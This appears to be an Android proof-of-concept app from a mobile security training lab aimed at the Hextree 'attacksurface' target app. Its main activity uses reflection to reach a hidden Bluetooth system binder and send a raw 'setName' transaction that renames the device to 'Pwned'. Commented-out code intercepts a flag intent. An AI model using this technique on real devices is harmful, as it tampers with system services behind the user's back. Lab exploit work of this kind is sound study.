package com.example.attackpoc;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.bluetooth.BluetoothAdapter;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.os.IInterface;
import android.os.Parcel;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.lang.reflect.Field;
import java.util.Objects;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PACKAGE = "io.hextree.attacksurface";
    private static final String TARGET_ACTIVITY = "io.hextree.attacksurface.activities.Flag10Activity";

    static final int TRANSACTION_setName = 7;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        // get incoming intent
        Intent intent = getIntent();
        Utils.showDialog(this, intent);

//        ((Button) this.<View>findViewById(R.id.btn_launch_activity)).setOnClickListener(new View.OnClickListener() {
        try {
                BluetoothAdapter adapter = BluetoothAdapter.getDefaultAdapter();
                @SuppressLint("DiscouragedPrivateApi") Field field = BluetoothAdapter.class.getDeclaredField("mService");
                field.setAccessible(true);
                IBinder binder = ((IInterface) field.get(adapter)).asBinder();

                Parcel parcel = Parcel.obtain();
                parcel.writeInterfaceToken(Objects.requireNonNull(binder.getInterfaceDescriptor()));
                parcel.writeString("Pwned"); // device name
                parcel.writeInt(0); // null AttributionSource

                Parcel reply = Parcel.obtain();
                binder.transact(TRANSACTION_setName, parcel, reply, 0);
            } catch (Throwable th) {
                throw new RuntimeException(th);
            }
//            @Override
//            public void onClick(View view) {
////                Intent intent = new Intent();
////                intent.setComponent(new ComponentName(TARGET_PACKAGE
////                        , TARGET_ACTIVITY));
//
//
//                Intent intent = getIntent();
//                if("io.hextree.attacksurfec.ATTACK_ME".equals(intent.getAction())) {
//                    String flag = intent.getStringExtra("flag");
//                    Log.d("Flag10", flag);
//                } else {
//                    Log.d("flag10", "Not Received");
//                }
//    startActivity(intent);
//            }
//        });

        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });
    }


}